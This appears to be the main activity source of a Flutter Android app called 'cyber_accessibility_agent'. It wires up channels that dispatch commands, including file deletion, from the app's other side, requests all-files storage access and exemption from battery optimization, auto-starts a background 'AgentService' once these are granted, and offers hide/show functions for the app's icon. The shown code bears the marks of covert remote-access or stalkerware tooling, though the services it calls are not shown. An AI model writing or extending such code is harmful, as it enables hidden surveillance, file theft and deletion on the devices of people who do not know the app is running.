package com.example.cyber_accessibility_agent

import android.Manifest
import android.content.Intent
import android.content.pm.PackageManager
import android.net.Uri
import android.os.*
import android.provider.Settings
import android.util.Base64OutputStream
import android.util.Log
import androidx.core.app.ActivityCompat
import androidx.core.content.ContextCompat
import io.flutter.embedding.android.FlutterActivity
import io.flutter.embedding.engine.FlutterEngine
import io.flutter.plugin.common.MethodChannel
import java.io.ByteArrayOutputStream
import java.util.concurrent.Executors

class MainActivity : FlutterActivity() {

    private val TAG = "MainActivity"

    private val COMMAND_CHANNEL = "cyber_accessibility_agent/commands"
    private val PERM_CHANNEL = "cyber_agent/permissions"
    private val BATTERY_CHANNEL = "cyber_agent/battery"
    private val APP_HIDER_CHANNEL = "cyber_accessibility_agent/app_hider"

    private val PERM_REQUEST_CODE = 14523
    private val BATTERY_REQUEST_CODE = 14524

    private var pendingPermResult: MethodChannel.Result? = null
    private var pendingBatteryResult: MethodChannel.Result? = null

    private val executor = Executors.newSingleThreadExecutor()

    @Volatile
    private var agentStarted = false

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
    }

    override fun onResume() {
        super.onResume()
        checkAndStartAgent()
    }

    override fun configureFlutterEngine(flutterEngine: FlutterEngine) {
        super.configureFlutterEngine(flutterEngine)

        MethodChannel(flutterEngine.dartExecutor.binaryMessenger, COMMAND_CHANNEL)
            .setMethodCallHandler { call, result ->
                when (call.method) {
                    "dispatch" -> {
                        val args = call.arguments as? Map<*, *> ?: run {
                            result.error("INVALID_ARGS", "Expected Map", null)
                            return@setMethodCallHandler
                        }

                        val action = args["action"]?.toString() ?: ""

                        if (action in listOf("rm", "rd", "delete", "remove")) {
                            if (!hasWritePermissions()) {
                                result.success(mapOf("success" to false, "error" to "permission_denied"))
                                return@setMethodCallHandler
                            }
                        }

                        executor.execute {
                            try {
                                val res = CommandDispatcher.dispatch(
                                    context = this,
                                    id = args["id"]?.toString() ?: "",
                                    action = action,
                                    payload = args["payload"] as? Map<*, *> ?: emptyMap<String, Any>()
                                )
                                result.success(res)
                            } catch (e: Exception) {
                                result.success(mapOf("success" to false, "error" to e.message))
                            }
                        }
                    }

                    "ping" -> result.success(mapOf("status" to "ok", "device" to Build.MODEL, "sdk" to Build.VERSION.SDK_INT))

                    else -> result.notImplemented()
                }
            }

        MethodChannel(flutterEngine.dartExecutor.binaryMessenger, PERM_CHANNEL)
            .setMethodCallHandler { call, result ->
                when (call.method) {
                    "checkStoragePermissions" -> result.success(currentPermissionMap())
                    "requestPermissions" -> requestPermissions(result)
                    else -> result.notImplemented()
                }
            }

        MethodChannel(flutterEngine.dartExecutor.binaryMessenger, BATTERY_CHANNEL)
            .setMethodCallHandler { call, result ->
                when (call.method) {
                    "isIgnoringBatteryOptimizations" -> result.success(isIgnoringBatteryOptimizations())
                    "requestIgnoreBatteryOptimizations" -> requestBatteryOptimization(result)
                    else -> result.notImplemented()
                }
            }

        MethodChannel(flutterEngine.dartExecutor.binaryMessenger, APP_HIDER_CHANNEL)
            .setMethodCallHandler { call, result ->
                when (call.method) {
                    "hide" -> result.success(AppHider.hide(this))
                    "show" -> result.success(AppHider.show(this))
                    "isVisible" -> result.success(AppHider.isVisible(this))
                    else -> result.notImplemented()
                }
            }
    }

    private fun checkAndStartAgent() {
        if (agentStarted) return
        val perms = currentPermissionMap()
        val hasStorage =
            perms["hasAllFilesAccess"] == true ||
            perms["readMediaImages"] == true ||
            perms["readMediaVideo"] == true ||
            perms["readMediaAudio"] == true ||
            (perms["legacyRead"] == true && perms["legacyWrite"] == true)
        val batteryOk = isIgnoringBatteryOptimizations()
        Log.d(TAG, "checkAndStartAgent → storage=$hasStorage battery=$batteryOk")
        if (hasStorage && batteryOk) startAgentService()
    }

    private fun startAgentService() {
        synchronized(this) {
            if (agentStarted) return
            agentStarted = true
        }
        try {
            val intent = Intent(this, AgentService::class.java).apply { action = AgentService.ACTION_START }
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) ContextCompat.startForegroundService(this, intent) else startService(intent)
            Log.i(TAG, "AgentService started")
        } catch (e: Exception) {
            synchronized(this) { agentStarted = false }
            Log.e(TAG, "Failed to start AgentService", e)
        }
    }

    private fun requestPermissions(result: MethodChannel.Result) {
        val need = mutableListOf<String>()
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
            need += Manifest.permission.READ_MEDIA_IMAGES
            need += Manifest.permission.READ_MEDIA_VIDEO
            need += Manifest.permission.READ_MEDIA_AUDIO
        } else {
            need += Manifest.permission.READ_EXTERNAL_STORAGE
            if (Build.VERSION.SDK_INT < Build.VERSION_CODES.R) need += Manifest.permission.WRITE_EXTERNAL_STORAGE
        }

        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R && !Environment.isExternalStorageManager()) {
            try {
                startActivity(Intent(Settings.ACTION_MANAGE_APP_ALL_FILES_ACCESS_PERMISSION).apply { data = Uri.parse("package:$packageName") })
            } catch (e: Exception) {
                Log.w(TAG, "MANAGE_EXTERNAL_STORAGE intent failed", e)
            }
        }

        val filtered = need.filter { ContextCompat.checkSelfPermission(this, it) != PackageManager.PERMISSION_GRANTED }
        if (filtered.isEmpty()) {
            result.success(currentPermissionMap())
            checkAndStartAgent()
            return
        }

        pendingPermResult = result
        ActivityCompat.requestPermissions(this, filtered.toTypedArray(), PERM_REQUEST_CODE)
    }

    override fun onRequestPermissionsResult(requestCode: Int, permissions: Array<String>, grantResults: IntArray) {
        if (requestCode != PERM_REQUEST_CODE) return
        pendingPermResult?.success(currentPermissionMap())
        pendingPermResult = null
        checkAndStartAgent()
    }

    private fun isIgnoringBatteryOptimizations(): Boolean {
        return if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
            try {
                val pm = getSystemService(POWER_SERVICE) as PowerManager
                pm.isIgnoringBatteryOptimizations(packageName)
            } catch (e: Exception) {
                Log.w(TAG, "Error checking battery optimization: ${e.message}", e)
                false
            }
        } else true
    }

    private fun requestBatteryOptimization(result: MethodChannel.Result) {
        if (isIgnoringBatteryOptimizations()) {
            result.success(true)
            checkAndStartAgent()
            return
        }

        pendingBatteryResult = result
        try {
            startActivityForResult(Intent(Settings.ACTION_REQUEST_IGNORE_BATTERY_OPTIMIZATIONS).apply { data = Uri.parse("package:$packageName") }, BATTERY_REQUEST_CODE)
        } catch (e: Exception) {
            Log.w(TAG, "Battery optimization intent failed", e)
            pendingBatteryResult = null
            result.success(false)
        }
    }

    override fun onActivityResult(requestCode: Int, resultCode: Int, data: Intent?) {
        if (requestCode == BATTERY_REQUEST_CODE) {
            val granted = isIgnoringBatteryOptimizations()
            pendingBatteryResult?.success(granted)
            pendingBatteryResult = null
            if (granted) checkAndStartAgent()
        }
        super.onActivityResult(requestCode, resultCode, data)
    }

    private fun hasWritePermissions(): Boolean {
        return if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R) {
            Environment.isExternalStorageManager()
        } else {
            ContextCompat.checkSelfPermission(this, Manifest.permission.WRITE_EXTERNAL_STORAGE) == PackageManager.PERMISSION_GRANTED
        }
    }

    private fun currentPermissionMap(): Map<String, Boolean> {
        val map = mutableMapOf<String, Boolean>()
        map["hasAllFilesAccess"] =
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R) Environment.isExternalStorageManager()
            else ContextCompat.checkSelfPermission(this, Manifest.permission.READ_EXTERNAL_STORAGE) == PackageManager.PERMISSION_GRANTED &&
                 ContextCompat.checkSelfPermission(this, Manifest.permission.WRITE_EXTERNAL_STORAGE) == PackageManager.PERMISSION_GRANTED

        map["legacyRead"] = ContextCompat.checkSelfPermission(this, Manifest.permission.READ_EXTERNAL_STORAGE) == PackageManager.PERMISSION_GRANTED
        map["legacyWrite"] = ContextCompat.checkSelfPermission(this, Manifest.permission.WRITE_EXTERNAL_STORAGE) == PackageManager.PERMISSION_GRANTED

        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
            map["readMediaImages"] = ContextCompat.checkSelfPermission(this, Manifest.permission.READ_MEDIA_IMAGES) == PackageManager.PERMISSION_GRANTED
            map["readMediaVideo"] = ContextCompat.checkSelfPermission(this, Manifest.permission.READ_MEDIA_VIDEO) == PackageManager.PERMISSION_GRANTED
            map["readMediaAudio"] = ContextCompat.checkSelfPermission(this, Manifest.permission.READ_MEDIA_AUDIO) == PackageManager.PERMISSION_GRANTED
        }

        map["isIgnoringBatteryOptimizations"] = isIgnoringBatteryOptimizations()
        return map
    }

    override fun onDestroy() {
        executor.shutdownNow()
        super.onDestroy()
    }
}